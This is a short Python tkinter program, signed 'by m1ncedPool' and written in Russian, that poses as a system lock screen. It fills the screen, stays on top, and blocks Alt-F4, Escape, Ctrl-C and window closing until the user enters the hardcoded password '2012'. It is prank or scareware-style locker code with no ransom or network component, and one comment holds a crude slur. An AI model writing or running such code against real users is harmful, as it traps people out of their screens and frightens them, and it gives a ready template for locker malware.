import tkinter as tk
from tkinter import messagebox
import sys
import os
import platform


class SystemLocker:
    def __init__(self):
        self.password = "2012"  # Пароль 2012
        self.root = tk.Tk()
        self.root.title("Система заблокирована")
        self.root.configure(bg='black')


        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)


        self.root.protocol("WM_DELETE_WINDOW", self.do_nothing)
        self.root.bind('<Alt-F4>', self.do_nothing)
        self.root.bind('<Escape>', self.do_nothing)
        self.root.bind('<Control-c>', self.do_nothing)
        self.root.bind('<Control-q>', self.do_nothing)
        self.root.bind('<Control-w>', self.do_nothing)
        self.root.bind('<F11>', self.do_nothing)

        self.setup_ui()

    def do_nothing(self, event=None):

        return "break"

    def setup_ui(self):


        main_frame = tk.Frame(self.root, bg='black')
        main_frame.pack(expand=True)


        label = tk.Label(
            main_frame,
            text="🔒 СИСТЕМА ЗАБЛОКИРОВАНА",
            font=('Arial', 24, 'bold'),
            fg='red',
            bg='black'
        )
        label.pack(pady=20)

        # ЯЯЯ ПИДООР
        tk.Label(
            main_frame,
            text="Введите пароль для разблокировки:",
            font=('Arial', 14),
            fg='white',
            bg='black'
        ).pack(pady=10)

        self.password_entry = tk.Entry(
            main_frame,
            show='*',
            font=('Arial', 16),
            width=20,
            justify='center'
        )
        self.password_entry.pack(pady=10)
        self.password_entry.bind('<Return>', self.check_password)
        self.password_entry.focus_set()


        unlock_btn = tk.Button(
            main_frame,
            text="Разблокировать",
            font=('Arial', 12),
            command=self.check_password,
            bg='red',
            fg='white',
            width=15,
            height=2
        )
        unlock_btn.pack(pady=10)


        hint = tk.Label(
            main_frame,
            text="Подсказка: год (4 цифры)",
            font=('Arial', 10),
            fg='gray',
            bg='black'
        )
        hint.pack(pady=5)


        warning = tk.Label(
            main_frame,
            text="Все действия заблокированы до ввода правильного пароля",
            font=('Arial', 10),
            fg='yellow',
            bg='black'
        )
        warning.pack(pady=20)


        info = tk.Label(
            main_frame,
            text="Пароль можно ввести с клавиатуры",
            font=('Arial', 8),
            fg='green',
            bg='black'
        )
        info.pack(pady=5)


        signature = tk.Label(
            main_frame,
            text="by m1ncedPool",
            font=('Arial', 8, 'italic'),
            fg='#666666',
            bg='black'
        )
        signature.pack(side='bottom', pady=10)

    def check_password(self, event=None):

        entered_password = self.password_entry.get()

        if entered_password == self.password:
            messagebox.showinfo("Успех", "Система разблокирована!")
            self.unlock_system()
        else:
            messagebox.showerror("Ошибка", "Неверный пароль!")
            self.password_entry.delete(0, tk.END)
            self.password_entry.focus_set()

    def unlock_system(self):

        self.root.quit()
        self.root.destroy()
        sys.exit()

    def run(self):

        print("by m1ncedPool")
        self.root.mainloop()


def prevent_multiple_instances():

    try:

        lock_file = os.path.join(os.getcwd(), 'locker.lock')
        if os.path.exists(lock_file):
            print("Программа уже запущена!")
            sys.exit()
        else:
            with open(lock_file, 'w') as f:
                f.write(str(os.getpid()))
    except:
        pass


def cleanup_lock_file():

    try:
        lock_file = os.path.join(os.getcwd(), 'locker.lock')
        if os.path.exists(lock_file):
            os.remove(lock_file)
    except:
        pass


if __name__ == "__main__":

    import atexit

    atexit.register(cleanup_lock_file)


    prevent_multiple_instances()


    locker = SystemLocker()

    try:
        locker.run()
    except KeyboardInterrupt:

        pass
    finally:
        cleanup_lock_file()